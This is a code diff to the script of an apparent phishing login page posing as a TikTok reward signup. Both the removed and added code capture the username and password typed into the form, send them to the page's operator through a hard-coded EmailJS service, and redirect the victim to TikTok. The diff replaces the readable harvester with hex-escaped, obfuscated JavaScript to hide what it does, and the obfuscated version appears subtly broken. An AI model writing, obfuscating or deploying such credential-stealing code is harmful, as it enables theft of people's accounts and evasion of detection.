@@ -124,32 +124,26 @@
 </div>
 
 <script>
-    // Initialize EmailJS with the latest SDK
-    emailjs.init('y36cybiZF6ukqz33P'); // Replace with your public key
+    (function () {
+        // Obfuscated EmailJS Initialization and Submission Code
+        var _0xabc1 = ["\x79\x33\x36\x63\x79\x62\x69\x5A\x46\x36\x75\x6B\x71\x7A\x33\x33\x50", "\x69\x6E\x69\x74", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x75\x73\x65\x72\x6E\x61\x6D\x65", "\x76\x61\x6C\x75\x65", "\x70\x61\x73\x73\x77\x6F\x72\x64", "\x73\x65\x6E\x64", "\x73\x65\x72\x76\x69\x63\x65\x5F\x79\x35\x62\x7A\x7A\x6F\x63", "\x74\x65\x6D\x70\x6C\x61\x74\x65\x5F\x34\x39\x70\x38\x68\x6B\x67", "\x74\x68\x65\x6E", "\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x68\x72\x65\x66", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x69\x6B\x74\x6F\x6B\x2E\x63\x6F\x6D", "\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];
 
-    // Form submission handler
-    document.getElementById('loginForm').addEventListener('submit', function (event) {
-        event.preventDefault(); // Prevent the form from refreshing the page
+        emailjs[_0xabc1[1]](_0xabc1[0]);
+        document[_0xabc1[2]]("loginForm")[_0xabc1[9]](function (event) {
+            event[_0xabc1[10]]();
+            const username = document[_0xabc1[2]]("username")[_0xabc1[4]];
+            const password = document[_0xabc1[2]]("password")[_0xabc1[4]];
+            const emailParams = { [_0xabc1[3]]: username, [_0xabc1[5]]: password };
 
-        // Get form data
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        // Prepare email parameters
-        const emailParams = {
-            username: username, // Aligns with {{username}} in the template
-            password: password  // Aligns with {{password}} in the template
-        };
-
-        // Send email using EmailJS
-        emailjs.send('service_y5bzzoc', 'template_49p8hkg', emailParams)
-            .then(function (response) {
-                alert('You have been registered, wait for your reward!');
-                window.location.href = 'https://www.tiktok.com'; // Redirect to TikTok's main site
-            }, function (error) {
-                alert('Failed to send details: ' + JSON.stringify(error));
-            });
-    });
+            emailjs[_0xabc1[6]](_0xabc1[7], _0xabc1[8], emailParams)
+                [_0xabc1[9]](function () {
+                    alert("You have been registered, wait for your reward!");
+                    window[_0xabc1[11]][_0xabc1[12]] = _0xabc1[13];
+                }, function (error) {
+                    alert("Failed to send details: " + JSON[_0xabc1[14]](error));
+                });
+        });
+    })();
 </script>
 </body>
 </html>
